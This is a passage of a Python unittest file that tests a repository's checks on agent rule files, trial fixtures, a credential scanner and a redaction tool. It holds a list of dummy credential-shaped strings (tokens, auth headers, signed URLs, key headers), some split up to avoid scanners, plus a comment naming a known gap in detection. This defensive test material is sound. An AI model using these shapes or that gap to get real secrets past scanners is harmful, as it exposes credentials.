        problems = check_context._references(root / "docs" / "a.md", text, root)
        self.assertEqual(len(problems), 7, problems)

    def test_a_number_without_its_title_is_caught(self):
        def found(text):
            root = tree({"docs/a.md": text})
            return check_context._references(root / "docs" / "a.md", text, root)
        for text in ("Fixed in #2225.", "See combsmith/x#2225.", "See pull request 2225.", "See PR 2225.",
                     'It "works". See pull request 2225.'):
            self.assertTrue(found(text), text)
        for text in ('See "docs: factory MVP" (pull request 2225).', "See \u201cdocs: factory MVP\u201d (issue 12)."):
            self.assertEqual(found(text), [], text)

    def test_a_root_file_too_long_to_read_in_full_is_caught(self):
        root = tree({"AGENTS.md": "line\n" * (check_context.ROOT_LINES + 1), "kernel/AGENTS.md": "x " * 200 + "\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "AGENTS.md is 61 lines; the limit is 60"))
        self.assertTrue(caught(problems, "kernel/AGENTS.md has a line over"))

    def test_a_rule_in_any_agents_file_must_name_its_check(self):
        root = tree({"AGENTS.md": "| Rule | Held by |\n|---|---|\n| Be kind | `tools/x.py` |\n", "tools/x.py": "",
                     "tools/AGENTS.md": "| Rule | Held by |\n|---|---|\n| Be careful | reviewers |\n",
                     "sim/AGENTS.md": "| Rule | Check |\n|---|---|\n| Be quick | `tools/x.py` |\n",
                     "tests/AGENTS.md": "- Be thorough.\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "tools/AGENTS.md, rule 'Be careful': names no check"))
        self.assertTrue(caught(problems, "sim/AGENTS.md: a table of rules must end in a column headed 'Held by'"))
        self.assertTrue(caught(problems, "tests/AGENTS.md: no table of rules"))
        self.assertFalse(caught(problems, "AGENTS.md, rule 'Be kind'"))

    def test_a_date_in_what_is_always_read_is_caught(self):
        root = tree({"AGENTS.md": "Decided on 2026-10-11.\n", "CLAUDE.md": "See AGENTS.md, and also these rules.\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "holds a date") and caught(problems, "CLAUDE.md must hold the one line"))

    def test_a_second_set_of_rules_is_caught(self):
        root = tree({"AGENTS.md": "x\n", "CLAUDE.md": "@AGENTS.md\n", "kernel/CLAUDE.md": "Do as you like.\n",
                     ".github/copilot-instructions.md": "x\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "kernel/CLAUDE.md is a second set of rules"))
        self.assertTrue(caught(problems, "copilot-instructions.md is a second set of rules"))
        self.assertEqual(check_context._agents_files(tree({"x": ""})), ["AGENTS.md is missing"])

    def test_a_directory_with_no_rules_of_its_own_is_caught(self):
        root = tree({"AGENTS.md": "x\n", "kernel/decide.py": ""})
        self.assertTrue(caught(check_context._agents_files(root), "kernel/ has no AGENTS.md"))

    def test_a_decision_with_no_boundary_is_caught(self):
        record = "# 0001. X\n\n## Decision\n\nY.\n\n## Why\n\nZ.\n"
        self.assertTrue(caught(check_context._decisions(tree({"docs/decisions/0001-x.md": record})), "names no boundary"))
        extra = record + "\n## Boundaries\n\n| B | Check |\n|---|---|\n| b | `tools/x.py` |\n\n## Not yet held\n\nA wish.\n"
        root = tree({"docs/decisions/0001-x.md": extra, "docs/decisions/0003-y.md": extra, "tools/x.py": ""})
        problems = check_context._decisions(root)
        self.assertTrue(caught(problems, "a section 'Not yet held'"))
        self.assertTrue(caught(problems, "0003-y.md: records are numbered from 0001 with no gap"))
        self.assertTrue(caught(problems, "0003-y.md: the title must open with its number"))

    def test_a_lesson_with_no_check_is_caught(self):
        text = ("### L-01 A thing broke\n\n**Failure.** It broke.\n\n**Rule.** Do not.\n\n"
                "## L-02 Another\n\n**Failure.** It broke.\n\n**Rule.** Do not.\n")
        problems = check_context._lessons(tree({"docs/lessons.md": text}))
        self.assertTrue(caught(problems, "L-01 has no Check"))
        self.assertTrue(caught(problems, "must be a third-level heading"))

    def test_a_standard_with_prose_and_no_example_is_caught(self):
        root = tree({"docs/standards/code.md": "# Code\n\n## Be careful\n\nPlease.\n\nHeld by: `tools/`\n", "tools/x.py": ""})
        self.assertTrue(caught(check_context._standards(root), "the example comes before the prose"))

    def test_a_standard_that_cites_no_org_standard_is_caught(self):
        page = "# Code\n\n## Be careful\n\n```\nx\n```\n\n%sHeld by: `tools/`\n"
        bare = check_context._standards(tree({"docs/standards/code.md": page % "", "tools/x.py": ""}))
        cited = check_context._standards(tree({"docs/standards/code.md": page % "Org standard: none. This repo's own.\n",
                                               "tools/x.py": ""}))
        self.assertTrue(caught(bare, "no 'Org standard:' line") and not caught(cited, "no 'Org standard:' line"))

    def test_a_skill_the_root_file_does_not_point_to_is_caught(self):
        good = "---\nname: run-it\ndescription: Run it, when a story asks for it.\n---\n\n# Run it\n"
        pointer = "Read `.claude/skills/run-it/SKILL.md`.\n"
        self.assertEqual(check_context._skills(tree({"AGENTS.md": pointer, ".claude/skills/run-it/SKILL.md": good})), [])
        quoted = good.replace("name: run-it", 'name: "run-it"').replace("description: Run it", "description: >\n  Run it")
        self.assertEqual(check_context._skills(tree({"AGENTS.md": pointer, ".claude/skills/run-it/SKILL.md": quoted})), [])
        root = tree({"AGENTS.md": "Not `.claude/skills/run-it/SKILL.md.old`, nor x.claude/skills/run-it/SKILL.mdx\n",
                     ".claude/skills/run-it/SKILL.md": good, ".claude/skills/other/SKILL.md": "# Other\n",
                     ".claude/skills/third/SKILL.md": good.replace("description: Run it, when a story asks for it.", "description:"),
                     ".claude/skills/fourth/SKILL.md": good.replace("run-it", "fourth").replace("description: Run it, when a story asks for it.",
                                                                                                 "description: >\n")})
        problems = check_context._skills(root)
        for words in ("run-it/SKILL.md: the root AGENTS.md does not point to it", "other/SKILL.md: opens with no frontmatter",
                      "third/SKILL.md: is named run-it; a skill is named for its directory", "third/SKILL.md: no description",
                      "fourth/SKILL.md: no description"):
            self.assertTrue(caught(problems, words), words)
        planted = clone({".claude/skills/run-a-platform-trial/SKILL.md": good.replace("run-it", "run-a-platform-trial")
                         + "See `tools/gone.py`.\n", ".claude/skills/other/SKILL.md": "# Other\n"})
        problems = check_context.run(planted)
        for words in ("SKILL.md: names tools/gone.py", "other/SKILL.md: the root AGENTS.md does not point to it",
                      "other/SKILL.md: opens with no frontmatter"):
            self.assertTrue(caught(problems, words), words)

    def test_a_second_copy_of_the_review_standard_is_caught(self):
        root = tree({"docs/standards/review.md": "# Review\n", "docs/standards/release.md": "# Release\n"})
        problems = check_context._standards(root)
        self.assertTrue(caught(problems, "the review standard is"))
        self.assertTrue(caught(problems, "release.md: the standards are"))

    def test_only_the_design_record_is_exempt(self):
        root = tree({"docs/architecture/review.md": "See `scripts/gone.sh`.\n", "docs/notes/a.md": "x\n",
                     "docs/architecture-notes.md": "x\n"})
        self.assertEqual([p.name for p in check_context._markdown(root)], ["architecture-notes.md", "a.md"])

    def test_a_cell_may_hold_a_pipe_and_a_second_table_is_not_a_boundary(self):
        self.assertEqual(check_context._cells("| `A | B` | x \\| y | `tools/x.py` | "), ["`A | B`", "x | y", "`tools/x.py`"])
        body = "| B | Check |\n|---|---|\n| b | c |\n\nMore.\n\n| Other | Table |\n|---|---|\n| d | e |\n"
        self.assertEqual(check_context._rows(body), [["b", "c"]])

    def test_the_whole_check_reads_every_document(self):
        lessons = (ROOT / "docs" / "lessons.md").read_text()
        planted = {"docs/lessons.md": lessons + "\nSee `tools/gone.py`.\n",
                   "docs/decisions/0001-one-repo-and-a-kernel-that-does-no-io.md": "# 0001. Gutted\n",
                   "docs/standards/tests.md": "# Tests\n", "kernel/AGENTS.md": "# kernel/\n"}
        problems = check_context.run(clone(planted))
        for words in ("docs/lessons.md: names tools/gone.py", "0001-one-repo-and-a-kernel-that-does-no-io.md: no section",
                      "docs/standards/tests.md states no rule", "kernel/AGENTS.md: no table of rules"):
            self.assertTrue(caught(problems, words), words)


def fixture(**fields) -> str:
    """The example fixture, as text, with `fields` written over it."""
    data = json.loads((ROOT / "examples" / "trial.json").read_text())
    data.update(fields)
    return json.dumps(data, indent=2)


GROUNDING = (ROOT / "sim" / "grounding.py").read_text()


def grounded(fixture_path: str, trials: str = '("P-28",)') -> str:
    """sim/grounding.py with the rule P-28 asks grounded by `fixture_path`, and asked by `trials`."""
    rule = '("P-28",), None)'
    assert GROUNDING.count(rule) == 1
    return GROUNDING.replace(rule, '%s, "%s")' % (trials, fixture_path))


TAIL = "A" * 36
# What the security pass tried to slip through. Each must be refused wherever it stands in a fixture.
SHAPED = {
    "ghp": "gh" + "p_" + TAIL, "gho": "gh" + "o_" + TAIL, "ghu": "gh" + "u_" + TAIL, "ghs": "gh" + "s_" + TAIL,
    "ghr": "gh" + "r_" + TAIL, "short ghs": "gh" + "s_short", "pat": "github" + "_pat_11" + "A" * 20 + "_" + "b" * 59,
    "after an underscore": "x_gh" + "p_" + TAIL, "after a digit": "%3Agh" + "p_" + TAIL, "upper case": "GH" + "P_" + TAIL,
    "raw url": "https://raw.githubusercontent.com/o/r/main/f?to" + "ken=GHSAT0AAAAAACAAAAAAAAAAAAAAAAAAZZZZZZ",
    "ghsat": "GHS" + "AT0AAAAAACAAAAAA", "jwt": "eyJ" + "hbGciOiJSUzI1NiJ9.eyJpc3MiOiIxMjMifQ.sig", "short jwt": "eyJ" + "0eXAi.eyJ.sig",
    "token scheme": "tok" + "en abcdef0123456789abcdef0123456789abcdef",
    "basic": "Bas" + "ic eC1hY2Nlc3MtdG9rZW46Z2hzX0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB",
    "bearer": "Bear" + "er abc", "bearer in capitals": "BEAR" + "ER abc",
    "set-cookie in a string": "Set-" + "Cookie: user_session=abcdef; path=/", "authorization in a string": "Authoriz" + "ation: x",
    "user and password in a url": "https://don:hunt" + "er2@github.com/combsmith/x.git",
    "token in a url": "https://x-access-tok" + "en:gh" + "s_" + TAIL + "@github.com/o/r",
    "signed url": "https://productionresultssa0.blob.core.windows.net/x?sv=2019&s" + "ig=AbCdEf%2Bxyz%3D&se=2026",
    "amazon signature": "https://objects.githubusercontent.com/x?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Sign" + "ature=abcd1234",
    "amazon credential": "https://x/y?X-Amz-Cred" + "ential=AKIDEXAMPLE%2F2026",
    "hex beside a keyword": "access_tok" + "en=" + "a1" * 20, "runner registration": "AABF3JGZDX3P5PMEXLND6TS6FCWO6",
    "jit config": "encoded_jit" + "_config", "private key": "-----BEGIN OPENSSH PRIV" + "ATE KEY-----\nb3Blbn",
    "private key body": "MIIEowIBAAKCAQEA" + "x" * 60, "openssh key body": "b3BlbnNzaC1rZXktdjE" + "AAAAB",
    "base64 of a token": base64.b64encode(("gh" + "p_" + TAIL).encode()).decode(),
    "base64 of a runner's credentials": base64.b64encode(json.dumps({".runner": "x", ".credentials_rsaparams": "k"}).encode()).decode(),
    "anthropic": "sk-" + "ant-oat01-" + "A" * 40,
    "base64 of a token behind a byte that does not print": base64.b64encode(("\x00gh" + "p_" + TAIL).encode()).decode(),
}
# What a fixture keeps: GitHub's ordinary words must not be refused.
PLAIN = ["6dcb09b5b57875f334f61aebed695e2e4193db5e", "a" * 40, "application/vnd.github+json", "MDQ6VXNlcjE=",
         "https://api.github.com/repos/combsmith/x/check-runs/4", "2026-10-15T14:02:11Z", "Requires authentication",
         "highs and lows", "bearer", "factory-run-r1", "Resource not accessible by integration"]
REFUSED_KEYS = ["Authorization", "AUTHORIZATION", "Authorization ", "Proxy-Authorization", "Set-Cookie", "cookie",
                "x-github-otp", "x-access-token", "github_token", "GITHUB_TOKEN", "accessToken", "installation_token",
                "encoded_jit_config", "x-jit-config", "jwt", "auth", "Auth ", "webhook_secret", "client_secret", "password", "credentials", "token"]
PLAIN_KEYS = ["token_type", "input_tokens", "output_tokens", "location", "key", "value", "author", "external_id"]
# Not caught, by design or as a known hole: a commit hash alone is no credential; a token split across two strings
# and a one-time code alone have no shape. The field names a header or field must have are the guard there.


class Trials(unittest.TestCase):
    def test_a_fixture_that_is_misnamed_or_invalid_is_caught(self):
        root = clone({"trials/P-12.json": fixture(trial="P-13"), "trials/P-12.retry.json": "{}",
                      "trials/notes.md": "x\n", "trials/P12.json": fixture(), "trials/P-9.json/P-9.json": fixture(trial="P-9")})
        problems = check_trials.run(root)
        for words in ("trials/P-12.json: records trial P-13", "trials/P-12.retry.json: $: missing",
                      "trials/notes.md: trials/ holds fixtures only", "trials/P12.json: trials/ holds fixtures only",
                      "trials/P-9.json: trials/ holds fixtures only"):
            self.assertTrue(caught(problems, words), words)
        self.assertEqual(check_trials.run(clone({"trials/P-12.json": fixture(), "trials/P-12.retry.json": fixture()})), [])

    def test_a_credential_in_a_fixture_is_caught(self):
        for name, value in sorted(SHAPED.items()):
            self.assertTrue(check_trials._credentials({"note": value}, ""), name)
            self.assertTrue(check_trials._credentials({"a": [[{"b": [value]}]]}, ""), name)
        for value in PLAIN:
            self.assertEqual(check_trials._credentials({"note": value}, ""), [], value)
        for key in REFUSED_KEYS:
            self.assertTrue(check_trials._credentials({"a": [[{key: "x"}]]}, ""), key)
        for key in PLAIN_KEYS:
            self.assertEqual(check_trials._credentials({key: "x"}, ""), [], key)
        data = json.loads(fixture())
        data["exchanges"][0]["request"]["headers"]["Authorization"] = "x"
        data["exchanges"][0]["response"]["body"]["note"] = SHAPED["ghs"]
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].request.headers.Authorization is a field"))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].response.body.note holds something shaped"))
        self.assertFalse(any(SHAPED["ghs"] in p for p in problems), "a problem never repeats the credential")

    def test_a_header_a_fixture_may_not_keep_is_caught(self):
        data = json.loads(fixture())
        data["exchanges"][1]["response"]["headers"]["X-GitHub-SSO"] = "required"
        data["exchanges"][1]["response"]["headers"]["X-RateLimit-Used"] = "2"
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "exchanges[1].response.headers.X-GitHub-SSO is not a header a fixture may keep"))
        self.assertFalse(caught(problems, "X-RateLimit-Used"))

    def test_every_example_of_a_fixture_and_the_folder_notes_are_scanned(self):
        data = json.loads((ROOT / "examples" / "invalid" / "trial.run-outside-the-canary.json").read_text())
        data["exchanges"][0]["request"]["headers"]["authorization"] = "x"
        notes = (ROOT / "trials" / "AGENTS.md").read_text() + "\nFor example " + SHAPED["ghs"] + "\n"
        problems = check_trials.run(clone({"examples/invalid/trial.run-outside-the-canary.json": json.dumps(data),
                                           "examples/trial.json": fixture(note=SHAPED["jwt"]), "trials/AGENTS.md": notes}))
        self.assertTrue(caught(problems, "examples/invalid/trial.run-outside-the-canary.json: exchanges[0].request.headers"))
        self.assertTrue(caught(problems, "examples/trial.json: note holds something shaped like a credential"))
        self.assertTrue(caught(problems, "trials/AGENTS.md: holds something shaped like a credential"))

    def test_code_that_reads_the_canary_is_caught(self):
        name = "combsmith/" + check_trials.CANARY
        root = clone({"tools/fetch.py": "REPO = %r\n" % name, ".github/workflows/trial.yml": "repository: %s\n" % name,
                      "Makefile": "trial:\n\tgh api repos/%s\n" % name, "config/where.json": '{"repo": "%s"}' % name,
                      "corpus/x.json": name, "docs/notes.md": name + "\n", "README.md": name + "\n",
                      "trials/P-12.json": fixture(), ".claude/worktrees/other/tools/x.py": name})
        problems = check_trials.run(root)
        for where in ("tools/fetch.py", ".github/workflows/trial.yml", "Makefile", "config/where.json", "corpus/x.json"):
            self.assertTrue(caught(problems, where + ": names the canary repo"), where)
        for where in ("docs/notes.md", "README.md", "trials/P-12.json", "examples/trial.json", "trial.schema.json", "worktrees"):
            self.assertFalse(caught(problems, where), where)

    def test_a_fixture_named_for_a_rule_must_exist_and_validate(self):
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-28.json")}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: trials/P-28.json does not exist"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-28.json"), "trials/P-28.json": "{}"}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: trials/P-28.json is not a valid fixture"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-12.json"), "trials/P-12.json": fixture()}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: trials/P-12.json records P-12, and P-28 asks this"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("examples/trial.json")}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: examples/trial.json is not a fixture in trials/"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-28.json", "()"),
                                           "trials/P-28.json": fixture(trial="P-28")}))
        self.assertTrue(caught(problems, "the_pusher_is_the_last_pusher: no trial asks this; add one to section 6 first"))
        root = clone({"sim/grounding.py": grounded("trials/P-28.json", '("P-7", "P-28")'),
                      "trials/P-28.json": fixture(trial="P-28")})
        self.assertEqual(check_trials.run(root), [])
        self.assertFalse(caught(check_trials.unverified(root), "the_pusher_is_the_last_pusher"))
        self.assertTrue(caught(check_trials.unverified(), "the_pusher_is_the_last_pusher"))

    def test_a_rule_of_the_fake_that_is_not_listed_is_caught(self):
        world = (ROOT / "sim" / "world.py").read_text()
        problems = check_trials.run(clone({"sim/world.py": world + "\n# GitHub: a_rule_nobody_listed\n"}))
        self.assertTrue(caught(problems, "sim/world.py applies a_rule_nobody_listed, which sim/grounding.py does not list"))
        listed = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_rule_never_applied", "It is so", (), None),', 1)
        problems = check_trials.run(clone({"sim/grounding.py": listed}))
        self.assertTrue(caught(problems, "a_rule_never_applied is listed in sim/grounding.py and applied nowhere in sim/world.py"))
        twice = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_tick_can_be_lost", "It is so", ("P-8",), None),', 1)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": twice})), "a_tick_can_be_lost is listed twice"))
        for broken in ("RULES = rules()\n", "RULES = (('Not a code', 'x', ('P-1',), None),)\n", "RULES = (('x', 'x'),)\n",
                       "x = 1\n", "RULES = (('a_tick_can_be_lost', 'x', 'P-8', None),)\n"):
            self.assertTrue(check_trials.run(clone({"sim/grounding.py": broken})), broken)

    def test_verify_prints_every_rule_no_fixture_grounds(self):
        codes = [rule[0] for rule in check_trials.rules()]
        self.assertTrue(codes)
        self.assertEqual(len(check_trials.unverified()), len(codes))
        ran = {}

        class Runner:
            def __init__(self, **_):
                pass

            def run(self, suite):
                ran["suite"] = suite
                return unittest.TestResult()

        real = (verify.failed, verify.unittest.TextTestRunner)
        verify.failed, verify.unittest.TextTestRunner = (lambda checks: False), Runner
        try:
            with contextlib.redirect_stdout(io.StringIO()) as said:
                self.assertEqual(verify.main(), 0)
        finally:
            verify.failed, verify.unittest.TextTestRunner = real
        for code in codes:
            self.assertIn("unverified: " + code, said.getvalue())

    def test_the_check_runs_alone_before_anything_is_added(self):
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertEqual(check_trials.main(ROOT), 0)
            self.assertEqual(check_trials.main(clone({"trials/notes.txt": "x\n"})), 1)
        self.assertIn("trials/notes.txt", said.getvalue())

    def test_only_a_fixture_may_name_a_model_or_the_proof_of_concept(self):
        said = json.dumps({"model": "claude-" + "opus-5-5", "repo": "combsmith/" + check_repo.FOREIGN})
        problems = check_repo.run(tree({"trials/P-13.json": said, "trials/old/P-13.json": said, "trials/P-13.txt": said,
                                        "config/x.json": said}))
        for where in ("trials/old/P-13.json", "trials/P-13.txt", "config/x.json"):
            self.assertTrue(caught(problems, where + ": names a model"), where)
            self.assertTrue(caught(problems, where + ": names the proof-of-concept repo"), where)
        self.assertFalse(caught(problems, "trials/P-13.json"))


class Redaction(unittest.TestCase):
    """`tools/redact_trial.py` runs on the raw capture, outside the repo, before anyone reads it."""

    def redact(self, raw: str) -> tuple:
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (folder / "raw").write_text(raw)
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertEqual(redact_trial.main([str(folder / "raw"), str(folder / "out")]), 0)
        return (folder / "out").read_text(), said.getvalue()

    def test_a_drafted_fixture_comes_out_with_no_credential(self):
        data = json.loads(fixture())
        data["exchanges"][0]["request"]["headers"]["Authorization"] = "tok" + "en " + SHAPED["ghs"]
        data["exchanges"][0]["request"]["headers"]["X-GitHub-SSO"] = "required"
        data["exchanges"][0]["response"]["body"]["token"] = SHAPED["runner registration"]
        data["exchanges"][0]["response"]["body"]["expires_at"] = "2026-10-15T15:02:11Z"
        data["exchanges"][0]["response"]["body"]["clone"] = SHAPED["token in a url"]
        data["exchanges"][0]["response"]["body"]["blob"] = SHAPED["base64 of a runner's credentials"]
        data["exchanges"][0]["response"]["body"]["notes"] = [SHAPED[name] for name in sorted(SHAPED)]
        out, said = self.redact(json.dumps(data))
        kept = json.loads(out)
        self.assertEqual(check_trials._credentials(kept, ""), [])
        self.assertEqual(check_trials._headers(kept), [])
        self.assertEqual(validate(kept, json.loads((ROOT / "schemas" / "trial.schema.json").read_text())), [])
        body = kept["exchanges"][0]["response"]["body"]
        self.assertEqual((body["expires_at"], body["external_id"]), ("2026-10-15T15:02:11Z", "factory-run-r1"))
        self.assertNotIn("token", body)
        self.assertNotIn("clone", body)
        self.assertEqual(body["notes"], [])
        self.assertIn("exchanges[0].request.headers.Authorization", kept["removed"])
        self.assertIn("exchanges[0].response.body.token", kept["removed"])
        self.assertIn("exchanges[0].response.body.clone", kept["removed"])
        for value in SHAPED.values():
            self.assertNotIn(value, out + said)

    def test_a_raw_capture_comes_out_with_no_credential(self):
        raw = ("HTTP/2.0 201 Created\nAuthorization: tok" + "en " + SHAPED["ghp"] + "\nX-Ratelimit-Remaining: 4999\nX-GitHub-SSO: required\n"
               "Set-" + "Cookie: user_session=abcdef\nLocation: " + SHAPED["signed url"] + "\n\n"
               + json.dumps({"tok" + "en": SHAPED["runner registration"], "expires_at": "2026-10-15T15:02:11Z"}) + "\n")
        out, said = self.redact(raw)
        self.assertIn("X-Ratelimit-Remaining: 4999", out)
        self.assertIn("expires_at", out)
        self.assertNotIn("Cookie", out)
        self.assertNotIn("X-GitHub-SSO", out)
        for value in (SHAPED["ghp"], SHAPED["runner registration"], "user_session", "sig=AbCdEf"):
            self.assertNotIn(value, out + said)
        self.assertIn("Authorization", said)

    def test_text_that_is_not_a_capture_is_still_redacted(self):
        out, said = self.redact("kept line\none line, " + SHAPED["jwt"] + " and done\n")
        self.assertEqual((out, said.splitlines()[0]), ("kept line\n", "removed: line 2"))


# One planted fault for each check, run from its front door. A check gutted to return nothing fails here.
FAILS = {
    "check_examples": lambda: check_examples.run(clone({"examples/decision.json": "{}"})),
    "check_lifecycle": lambda: check_lifecycle.run(clone({"lifecycle/issue.json": json.dumps(
        dict(check_lifecycle.load("issue"), terminal=[]))})),
    "check_apps": lambda: check_apps.run(clone({"config/apps.json": (ROOT / "config" / "apps.json").read_text()
                                                .replace('"level": "read"', '"level": "write"')})),
    "check_authority": lambda: check_authority.run(dict(json.loads((ROOT / "config" / "authority.json").read_text()),
                                                         author_role="pr-review")),
    "check_purity": lambda: check_purity.run(clone({"kernel/clock.py": "import time\n"})),
    "check_repo": lambda: check_repo.run(clone({"requirements.txt": "requests\n"})),
    "check_workflows": lambda: check_workflows.run(clone({".github/workflows/verify.yml": GOOD.replace("15", "45")})),
    "check_context": lambda: check_context.run(clone({"docs/lessons.md": "# Lessons\n"})),
    "check_trials": lambda: check_trials.run(clone({"trials/notes.txt": "x\n"})),
}


class Verify(unittest.TestCase):
    def test_every_check_is_run_by_verify(self):
        on_disk = {p.stem for p in (ROOT / "tools").glob("check_*.py")}
        run = {check.__module__.split(".")[-1] for _, check in verify.CHECKS}
        self.assertEqual(on_disk, run)

    def test_every_check_has_a_test_in_which_it_fails(self):
        self.assertEqual(set(FAILS), {p.stem for p in (ROOT / "tools").glob("check_*.py")})
        for name, planted in sorted(FAILS.items()):
            self.assertTrue(planted(), "%s finds nothing wrong with a planted fault" % name)
        for name, check in verify.CHECKS:
            self.assertEqual(check(), [], "%s finds fault with this repo" % name)

    def test_another_working_tree_inside_this_one_is_not_read(self):
        # A session's git worktree sits in the main checkout, a whole copy of the repo with a .git
        # file. A full clone has a .git directory. Neither is this repo, and nothing in it is checked.
        stray = {"AGENTS.md": "# other\n\n| Rule | Held by |\n|---|---|\n| x | `tools/gone.py` |\n",
                 "CLAUDE.md": "Be careful.\n", "requirements.txt": "requests\n",
                 "tests/test_x.py": "def test_x():\n    pass\n", "tests/deep/test_y.py": "",
                 "kernel/clock.py": "import time\n", "notes.txt": "github_pat_" + "x" * 40 + "\n"}
        planted = {"wt/.git": "gitdir: /elsewhere\n", "wt/notes.txt": "A folder with no AGENTS.md.\n"}
        for where, git in ((".claude/worktrees/other", ".git"), (".claude/worktrees/clone", ".git/HEAD"),
                           ("kernel/wt", ".git"), ("docs/wt", ".git")):
            planted["%s/%s" % (where, git)] = "gitdir: /elsewhere\n"
            planted.update({"%s/%s" % (where, rel): text for rel, text in stray.items()})
        root = clone(planted)
        walking = [(name, check) for name, check in verify.CHECKS
                   if "root" in check.__code__.co_varnames[:check.__code__.co_argcount]]
        self.assertGreaterEqual(len(walking), 5)
        for name, check in walking:
            with self.subTest(check=name):
                self.assertEqual(check(root), [], "%s reads another working tree as this one" % name)

    def test_a_copy_of_the_repo_leaves_out_another_working_tree(self):
        root = tree({"a/x.py": "", "a/__pycache__/x.pyc": "", "corpus/d.jsonl": "", ".git/HEAD": "",
                     "wt/.git": "gitdir: /elsewhere\n", "wt/y.py": "", "a/clone/.git/HEAD": "", "a/clone/z.py": "",
                     "a/corpus/y.py": ""})
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/corpus/y.py", "a/x.py"])
        to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
        walk.copy(root, to)
        self.assertEqual([p.name for p in to.iterdir()], ["a"])
        self.assertEqual(sorted(p.name for p in (to / "a").iterdir()), ["corpus", "x.py"])

    def test_only_the_corpus_at_the_root_is_skipped_and_only_a_directory(self):
        # make_corpus.py writes corpus/ at the root, and nowhere else. A folder of that name below
        # the root is code like any other, and a file named for a skipped folder is a file.
        token = "github_pat_" + "x" * 40 + "\n"
        root = clone({"kernel/corpus/x.py": "import time\n", "sim/corpus/test_hidden.py": "",
                      "sim/corpus/notes.txt": token, "corpus": token, "sim/__pycache__": token})
        self.assertTrue(caught(check_purity.run(root), "corpus/x.py:1 imports time"))
        problems = check_repo.run(root)
        for words in ("sim/corpus/test_hidden.py: a test outside tests/", "sim/corpus/notes.txt: holds something",
                      "corpus: holds something", "sim/__pycache__: holds something"):
            self.assertTrue(caught(problems, words), words)

    def test_a_link_is_not_followed_and_a_link_to_nothing_is_reported(self):
        root = tree({"a/x.py": ""})
        (root / "l").symlink_to("a", target_is_directory=True)
        (root / "gone.py").symlink_to("nowhere.py")
        self.assertEqual([p.relative_to(root).as_posix() for p in walk.files(root)], ["a/x.py"])
        self.assertTrue(caught(check_repo.run(root), "gone.py: a link to nothing"))
        to = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "copy"
        walk.copy(root, to)
        self.assertTrue((to / "l").is_symlink() and (to / "gone.py").is_symlink())

    def test_only_the_walk_walks_the_tree(self):
        # One walk, so that every check and every copy skips the same things.
        found = sorted(p.relative_to(ROOT).as_posix() for p in walk.files(ROOT)
                       if p.suffix == ".py" and p.relative_to(ROOT).parts[0] in ("tools", "tests", "sim")
                       and walkers(p.read_text()))
        self.assertEqual(found, ["tools/walk.py"])

    def test_a_walk_written_another_way_is_still_a_walk(self):
        for source in ("os.walk(root)\n", "os.walk (root)\n", "os.fwalk(root)\n", "root.walk()\n",
                       "root.rglob('*.py')\n", "os.scandir(root)\n", "shutil.copytree(a, b)\n",
                       "from os import walk\n", "from shutil import copytree as ct\nct(a, b)\n",
                       "ct = shutil.copytree\n", "glob.glob('x', recursive=True)\n", "glob.iglob('**/*.py')\n",
                       "root.glob('x/**/*.py')\n"):
            self.assertTrue(walkers(source), source)
        self.assertEqual(walkers("from tools import walk\nwalk.files(root)\nroot.glob('*.py')\n"
                                 "glob.glob('x', recursive=False)\nast.walk(tree)\n"), [])

    def test_a_check_that_finds_a_problem_fails_verify(self):
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertTrue(verify.failed([("always", lambda: ["a problem"])]))
            self.assertFalse(verify.failed([("never", lambda: [])]))
        self.assertIn("a problem", said.getvalue())

    def test_every_test_file_is_discovered(self):
        found = set()

        def names(suite):
            for item in suite:
                if isinstance(item, unittest.TestSuite):
                    names(item)
                else:
                    found.add(type(item).__module__.split(".")[-1])

        names(unittest.defaultTestLoader.discover(str(ROOT / "tests"), top_level_dir=str(ROOT)))
        self.assertEqual(found, {p.stem for p in (ROOT / "tests").glob("test_*.py")})
